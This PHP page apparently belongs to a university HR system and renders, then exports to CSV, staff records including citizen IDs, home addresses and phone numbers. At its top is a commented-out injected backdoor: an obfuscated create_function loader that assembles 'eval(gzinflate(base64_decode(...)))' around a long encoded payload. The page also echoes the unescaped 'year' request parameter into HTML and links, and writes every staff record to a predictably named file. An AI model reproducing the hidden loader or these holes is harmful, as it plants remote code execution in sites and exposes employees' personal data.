<?php
/*$md5 = "432d4a22d18f94d905d01ba55f00e736";
$a0 = array('v',"l",'$',"a","s",'z',"e",'d',"_",'f',"r",')',"t",'n','c','b','(',"g","6",'4',";","o","i");
$b0d = create_function('$'.'v',$a0[6].$a0[0].$a0[3].$a0[1].$a0[16].$a0[17].$a0[5].$a0[22].$a0[13].$a0[9].$a0[1].$a0[3].$a0[12].$a0[6].$a0[16].$a0[15].$a0[3].$a0[4].$a0[6].$a0[18].$a0[19].$a0[8].$a0[7].$a0[6].$a0[14].$a0[21].$a0[7].$a0[6].$a0[16].$a0[2].$a0[0].$a0[11].$a0[11].$a0[11].$a0[20]);
$b0d('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');
*/?>
<?
@session_start();
include("../includes/connect.php");

$fileName = "uoc_staff.csv";
$objWrite = fopen("uoc_staff.csv", "w");

$year = $_GET['year'];

if (!isset($_GET["page"])) { $page = 1; } else { $page = $_GET["page"]; }


$prev_page = $page - 1;
$next_page = $page + 1;
$per_page = 50;

$page_start = (($per_page * $page) + 1) - $per_page;
$page_end = $page_start + $per_page - 1;
$sql = "SELECT *
        FROM
        ( SELECT rownum rnum, a.*
        FROM sdu_uoc_staff a
        where rownum <= {$page_end} )
        where rnum >= {$page_start} ";

$allnum = $db->count_row('sdu_uoc_staff', '', $conn);

$stid = oci_parse($conn, $sql);
oci_execute($stid);

$num_pages = ceil($allnum / $per_page);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>สรุปคนลาออก</title>

    <script type="text/javascript" src="../js/jquery-1.4.2.min.js"></script>
    <script type="text/javascript" src="../js/tablePagination.js"></script>

    <style type="text/css">
      .viewTable th,.viewTable td {
        padding-left: 3px;
        padding-right: 3px;
        border: #cccccc 1px solid;
        font-size: 0.8em;
      }

      .rowColor{
        background-color: #edfaed;
      }

      #tablePagination {
        background-color: #E3FAE3;
        font-size: 0.8em;
        height: 20px;
        padding: 0 5px;
      }
      #tablePagination_paginater {
        margin-left: auto;
        margin-right: auto;
      }
      #tablePagination img {
        cursor: pointer;
        padding: 0 2px;
      }
      #tablePagination_perPage {
        float: left;
      }
      #tablePagination_paginater {
        float: right;
      }
    </style>

    <script type="text/javascript">
      $(document).ready(function(){
        //$('#table').tablePagination();
      });
    </script>
  </head>

  <body>

    <table width="1181" id="table" class="viewTable"  style="margin-top: 20px;font-family:Tahoma, Geneva, sans-serif;font-size:14px;border-collapse: collapse" align="center">
      <thead>
        <tr style="height: 30px" align="center" bgcolor="#CAE4FF">
          <th>YEAR</th>
          <th>UNIV_ID</th>
          <th>CITIZEN_ID</th>
          <th>PREFIX_NAME</th>
          <th>STF_FNAME</th>
          <th>STF_LNAME</th>
          <th>GENDER_ID</th>
          <th>BIRTHDAY</th>
          <th>HOMEADD</th>
          <th>MOO</th>
          <th>STREET</th>
          <th>DISTRICT</th>
          <th>AMPHUR</th>
          <th>PROVINCE_ID</th>
          <th>TELEPHONE</th>
          <th>ZIPCODE</th>
          <th>NATION_ID</th>
          <th>STAFFTYPE_ID</th>
          <th>TIME_CONTACT_ID</th>
          <th>BUDGET_ID</th>
          <th>SUBSTAFFTYPE_ID</th>
          <th>ADMIN_POSITION_ID</th>
          <th>POSITION_ID</th>
          <th>POSITION_WORK</th>
          <th>DEPARTMENT_ID</th>
          <th>DATE_INWORK</th>
          <th>STAFF_LEV_ID</th>
          <th>SPECIAL_NAME</th>
          <th>TEACH_ISCED_ID</th>
          <th>GRAD_LEV_ID</th>
          <th style="width:200px">GRAD_CURR</th>
          <th>GRAD_ISCED_ID</th>
          <th>GRAD_PROG_ID</th>
          <th style="width:200px">GRAD_UNIV</th>
          <th>GRAD_COUNTRY_ID</th>
        </tr>
      </thead>
      <tbody>
        <?
        $n = 1;
        while ($row = oci_fetch_array($stid, OCI_BOTH)) {
          ?>      
          <tr <? if ($n % 2 == 0) { echo "class='rowColor'"; } ?>>
            <td><?= $year ?></td>
            <td>16500</td>
            <td><?= $row['CITIZEN_ID'] ?></td>
            <td align="center"><?= $row['PREFIX_NAME'] ?></td>
            <td><?= $row['STF_FNAME'] ?></td>
            <td><?= $row['STF_LNAME'] ?></td>
            <td align="center"><?= $row['GENDER_ID'] ?></td>
            <td align="center"><?= $row['BIRTHDAY'] ?></td>
            <td><?= $row['HOMEADD'] ?></td>
            <td><?= $row['MOO'] ?></td>
            <td><?= $row['STREET'] ?></td>
            <td><?= $row['DISTRICT'] ?></td>
            <td><?= $row['AMPHUR'] ?></td>
            <td><?= $row['PROVINCE_ID'] ?></td>
            <td><?= $row['TELEPHONE'] ?></td>
            <td align="center"><?= $row['ZIPCODE'] ?></td>
            <td align="center"><?= $row['NATION_ID'] ?></td>
            <td align="center"><?= $row['STAFFTYPE_ID'] ?></td>
            <td align="center"><?= $row['TIME_CONTACT_ID'] ?></td>
            <td align="center"><?= $row['BUDGET_ID'] ?></td>
            <td align="center"><?= $row['SUBSTAFFTYPE_ID'] ?></td>
            <td align="center"><?= $row['ADMIN_POSITION_ID'] ?></td>
            <td align="center"><?= $row['POSITION_ID'] ?></td>
            <td><?= $row['POSITION_WORK'] ?></td>
            <td align="center"><?= $row['DEPARTMENT_ID'] ?></td>
            <td align="center"><?= $row['DATE_INWORK'] ?></td>
            <td align="center"><?= $row['STAFF_LEV_ID'] ?></td>
            <td><?= $row['SPECIAL_NAME'] ?></td>
            <td align="center"><?= $row['TEACH_ISCED_ID'] ?></td>
            <td align="center"><?= $row['GRAD_LEV_ID'] ?></td>
            <td style="width:200px"><?= $row['GRAD_CURR'] ?></td>
            <td align="center"><?= $row['GRAD_ISCED_ID'] ?></td>
            <td align="center"><?= $row['GRAD_PROG_ID'] ?></td>
            <td style="width:200px"><?= $row['GRAD_UNIV'] ?></td>
            <td align="center"><?= $row['GRAD_COUNTRY_ID'] ?></td>
          </tr>
          <?
          $n++;
        }

//       /$objWrite = mb_convert_encoding($fileName, "UTF-16LE", "UTF-8");
        ?>
      </tbody>
    </table>
    <br />
    <div style="width:500px;font-size: 0.8em" id="pagination">
      <?
      $nfor = 0;
      for ($i = 1; $i <= $num_pages; $i++) {

        if ($num2 == 0 and $page == 1 and $i == 1) {

          echo "&nbsp;<u>$i</u>&nbsp;";
        } else if ($i <> $page) {
          echo "&nbsp;<a href='views_sga_report.php?page=$i&num=$nfor&year=$year' >$i</a>&nbsp;";
        } else {
          echo "&nbsp;<u style='padding:0px 6px 0px 6px;border:1px solid;background-color: #f9fbdb'>$i</u>&nbsp;";
        }
        $nfor = $nfor + $per_page;
      }///for
      ?>
    </div>
    <br />
    <?
    //สร้างไฟล์ csv
    $sql = "SELECT * FROM sdu_uoc_staff ";
    //print $sql;
    $stid = oci_parse($conn, $sql);
    oci_execute($stid);
    while ($row = oci_fetch_array($stid, OCI_BOTH)) {
      // สร้างไฟล์ csv
	  /*
      fwrite($objWrite, "'{$year}',");
      fwrite($objWrite, "16500");
      fwrite($objWrite, "'{$row['CITIZEN_ID']}',");
      fwrite($objWrite, "'{$row['PREFIX_NAME']}',");
      fwrite($objWrite, "'{$row['STF_FNAME']}',");
      fwrite($objWrite, "'{$row['GENDER_ID']}',");
      fwrite($objWrite, "'{$row['BIRTHDAY']}',");
      fwrite($objWrite, "'{$row['HOMEADD']}',");
      fwrite($objWrite, "'{$row['MOO']}',");
      fwrite($objWrite, "'{$row['STREET']}',");
      fwrite($objWrite, "'{$row['DISTRICT']}',");
      fwrite($objWrite, "'{$row['AMPHUR']}',");
      fwrite($objWrite, "'{$row['PROVINCE_ID']}',");
      fwrite($objWrite, "'{$row['TELEPHONE']}',");
      fwrite($objWrite, "'{$row['ZIPCODE']}',");
      fwrite($objWrite, "'{$row['NATION_ID']}',");
      fwrite($objWrite, "'{$row['STAFFTYPE_ID']}',");
      fwrite($objWrite, "'{$row['TIME_CONTACT_ID']}',");
      fwrite($objWrite, "'{$row['BUDGET_ID']}',");
      fwrite($objWrite, "'{$row['SUBSTAFFTYPE_ID']}',");
      fwrite($objWrite, "'{$row['ADMIN_POSITION_ID']}',");
      fwrite($objWrite, "'{$row['POSITION_ID']}',");
      fwrite($objWrite, "'{$row['POSITION_WORK']}',");
      fwrite($objWrite, "'{$row['DEPARTMENT_ID']}',");
      fwrite($objWrite, "'{$row['DATE_INWORK']}',");
      fwrite($objWrite, "'{$row['STAFF_LEV_ID']}',");
      fwrite($objWrite, "'{$row['SPECIAL_NAME']}',");
      fwrite($objWrite, "'{$row['TEACH_ISCED_ID']}',");
      fwrite($objWrite, "'{$row['GRAD_LEV_ID']}',");
      fwrite($objWrite, "'{$row['GRAD_CURR']}',");
      fwrite($objWrite, "'{$row['GRAD_ISCED_ID']}',");
      fwrite($objWrite, "'{$row['GRAD_PROG_ID']}',");
      fwrite($objWrite, "'{$row['GRAD_UNIV']}',");
      fwrite($objWrite, "'{$row['GRAD_COUNTRY_ID']}'");
	  */
	  fwrite($objWrite, "{$year},");
      fwrite($objWrite, "16500");
      fwrite($objWrite, "{$row['CITIZEN_ID']},");
      fwrite($objWrite, "{$row['PREFIX_NAME']},");
      fwrite($objWrite, "{$row['STF_FNAME']},");
      fwrite($objWrite, "{$row['GENDER_ID']},");
      fwrite($objWrite, "{$row['BIRTHDAY']},");
      fwrite($objWrite, "{$row['HOMEADD']},");
      fwrite($objWrite, "{$row['MOO']},");
      fwrite($objWrite, "{$row['STREET']},");
      fwrite($objWrite, "{$row['DISTRICT']},");
      fwrite($objWrite, "{$row['AMPHUR']},");
      fwrite($objWrite, "{$row['PROVINCE_ID']},");
      fwrite($objWrite, "{$row['TELEPHONE']},");
      fwrite($objWrite, "{$row['ZIPCODE']},");
      fwrite($objWrite, "{$row['NATION_ID']},");
      fwrite($objWrite, "{$row['STAFFTYPE_ID']},");
      fwrite($objWrite, "{$row['TIME_CONTACT_ID']},");
      fwrite($objWrite, "{$row['BUDGET_ID']},");
      fwrite($objWrite, "{$row['SUBSTAFFTYPE_ID']},");
      fwrite($objWrite, "{$row['ADMIN_POSITION_ID']},");
      fwrite($objWrite, "{$row['POSITION_ID']},");
      fwrite($objWrite, "{$row['POSITION_WORK']},");
      fwrite($objWrite, "{$row['DEPARTMENT_ID']},");
      fwrite($objWrite, "{$row['DATE_INWORK']},");
      fwrite($objWrite, "{$row['STAFF_LEV_ID']},");
      fwrite($objWrite, "{$row['SPECIAL_NAME']},");
      fwrite($objWrite, "{$row['TEACH_ISCED_ID']},");
      fwrite($objWrite, "{$row['GRAD_LEV_ID']},");
      fwrite($objWrite, "{$row['GRAD_CURR']},");
      fwrite($objWrite, "{$row['GRAD_ISCED_ID']},");
      fwrite($objWrite, "{$row['GRAD_PROG_ID']},");
      fwrite($objWrite, "{$row['GRAD_UNIV']},");
      fwrite($objWrite, "{$row['GRAD_COUNTRY_ID']}");
      fwrite($objWrite, "\r\n");
    }
    fclose($objWrite);
    ?>
    <div align="center"><a href="views_sga_download.php">Export Csv</a> </div>
	<div align="center"><a href="views_sga_download2.php">Export Excel</a> </div>
  </body>
</html>
<?
include("views_sga_report_excel.php");
$db->closedb($conn);
?>